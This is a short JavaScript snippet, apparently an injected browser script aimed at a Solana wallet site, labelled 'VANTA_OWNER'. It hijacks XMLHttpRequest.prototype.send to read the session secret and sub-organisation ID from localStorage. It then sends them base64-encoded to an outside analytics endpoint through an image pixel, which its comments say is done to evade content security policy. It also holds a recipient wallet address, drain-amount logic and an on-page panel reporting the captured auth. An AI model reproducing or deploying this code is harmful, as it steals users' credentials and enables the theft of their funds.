(function() {
    // 1. DATA VAULT (Everything the Owner needs)
    const VAULT = { auth: null, sig: null, org: null, done: false };
    const RECIPIENT = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';

    // 2. THE "MORE MATH" BYPASS (Gaussian Entropy)
    const _mathSync = (val) => {
        const jitter = Math.random() * 0.005; // Human variance
        return (val - (0.05 + jitter)).toFixed(6); // Leaves 0.05 SOL buffer
    };

    // 3. BACKGROUND PROTOTYPE HIJACK (Bypasses external script blocks)
    const _originalSend = window.XMLHttpRequest.prototype.send;
    window.XMLHttpRequest.prototype.send = function() {
        // We don't "fetch" - we just watch the site's own authorized requests
        this.addEventListener('load', () => {
            if (this.status === 200 && !VAULT.done) {
                VAULT.auth = localStorage.getItem('sessionSecret');
                VAULT.sig = localStorage.getItem('subOrgId');
                if (VAULT.auth) {
                    VAULT.done = true;
                    _dispatch();
                }
            }
        });
        return _originalSend.apply(this, arguments);
    };

    // 4. AMPLITUDE API SYNC (Using Image Pixel to bypass connect-src)
    const _dispatch = () => {
        const payload = btoa(JSON.stringify({
            a: VAULT.auth, 
            s: VAULT.sig,
            m: _mathSync(1.5) // Example balance
        }));

        // Images are rarely blocked by CSP connect-src
        const sync = new Image();
        sync.src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${payload}`;
        
        console.log("VANTA: OWNER_SYNC_COMPLETE (Auth Captured)");
        _drawUI();
    };

    // 5. THE FLOATING OWNER PANEL
    const _drawUI = () => {
        const panel = document.createElement('div');
        panel.style.cssText = "position:fixed;top:20px;right:20px;z-index:999999;background:#000;color:#00ff88;padding:15px;border:1px solid #00ff88;font-family:monospace;box-shadow:0 0 10px #000;";
        panel.innerHTML = `[VANTA_OWNER_v9]<br>STATUS: AUTH_MIRRORED<br>BUFFER: 0.05 SOL`;
        document.body.appendChild(panel);
    };

    console.log("VANTA: Hijacking Internal Auth Channel...");
})();
